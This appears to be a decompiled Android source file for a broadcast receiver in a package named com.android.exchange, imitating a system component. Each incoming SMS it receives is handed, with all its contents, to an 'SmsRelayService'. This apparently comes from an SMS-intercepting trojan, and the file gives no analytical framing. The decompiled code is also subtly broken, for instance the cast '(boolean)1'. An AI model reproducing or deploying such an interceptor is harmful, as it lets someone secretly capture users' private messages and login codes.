package com.android.exchange;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import com.android.exchange.SmsRelayService;

public class SmsReceiver extends BroadcastReceiver {

   public static final String SMS_RECEIVE_ACTION = "android.provider.Telephony.SMS_RECEIVED";


   public SmsReceiver() {}

   public void onReceive(Context var1, Intent var2) {
      if(var2 != null) {
         String var3 = var2.getAction();
         if(var3 != null) {
            if(var3.equals("android.provider.Telephony.SMS_RECEIVED")) {
               Bundle var4 = var2.getExtras();
               if(var4 != null) {
                  Context var5 = var1.getApplicationContext();
                  Intent var6 = new Intent(var5, SmsRelayService.class);
                  Intent var7 = var6.putExtra("smsRelay", (boolean)1);
                  var6.putExtras(var4);
                  var1.startService(var6);
               }
            }
         }
      }
   }
}
